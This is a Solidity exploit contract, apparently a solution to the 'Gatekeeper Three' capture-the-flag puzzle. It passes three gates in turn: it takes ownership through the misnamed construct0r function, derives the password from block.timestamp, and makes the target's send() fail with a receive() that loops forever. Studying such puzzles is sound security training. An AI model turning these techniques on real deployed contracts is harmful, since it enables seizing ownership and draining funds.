// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./GatekeeperThree.sol";
import "hardhat/console.sol";

contract HackGatekeeperThree {
    GatekeeperThree gk3;
    SimpleTrick st;

    constructor(address payable gatekeeperThree) {
        gk3 = GatekeeperThree(gatekeeperThree);
        gk3.createTrick();
        st = SimpleTrick(gk3.trick());
    }

    function attack() external payable {
        // Gate 1
        gk3.construct0r(); // set this contract to owner

        // Gate 2
        st.checkPassword(0); // set password to actual block.timestamp
        gk3.getAllowance(block.timestamp);

        // Gate3
        (bool success,) = address(gk3).call{value: msg.value}("");
        require(success, "Failed to send eth");

        gk3.enter();
        require(gk3.entrant() == msg.sender, "hack failed");

    }

    // block the send() method
    receive() external payable {
        while (true) {}
    }
}